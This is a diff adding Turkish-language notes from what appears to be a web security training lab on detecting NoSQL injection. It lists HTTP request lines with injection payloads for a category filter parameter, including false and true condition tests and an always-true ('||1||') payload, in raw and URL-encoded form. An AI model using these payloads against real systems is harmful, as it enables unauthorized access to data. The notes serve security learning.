@@ -1,0 +1,14 @@
+1
+Laboratuvar: NoSQL enjeksiyonunun tespiti
+
+GET /filter?category=Gifts HTTP/2 => isteğinde nosql injektion deniyoruz.
+GET /filter?category=Gifts'+' HTTP/2 => ctrl+u ile encode ettik.Sunucu tarafı enjeksiyon olabilir.
+GET /filter?category=Gifts'%2b' HTTP/2
+GET /filter?category=Gifts' && 0 && 'x HTTP/2 => Kategori parametresine yanlış bir koşul ekleyin. Örneğin:
+GET /filter?category=Gifts'+%26%26+0+%26%26+'x HTTP/2 => Yükü URL kodlamayı unutmayın. Hiçbir ürünün alınmadığına dikkat edin.
+GET /filter?category=GiftsGifts' && 1 && 'x HTTP/2 => Kategori parametresine doğru bir koşul ekleyin. Örneğin:
+GET /filter?category=GiftsGifts'+%26%26+1+%26%26+'x HTTP/2 => Yükü URL kodlamayı unutmayın. Hediyeler kategorisindeki ürünlerin alındığına dikkat edin.
+GET /filter?category=GiftsGifts'||1||' HTTP/2 => 1. Yanıta sağ tıklayın ve Yanıtı tarayıcıda göster seçeneğini seçin .
+
+
+2
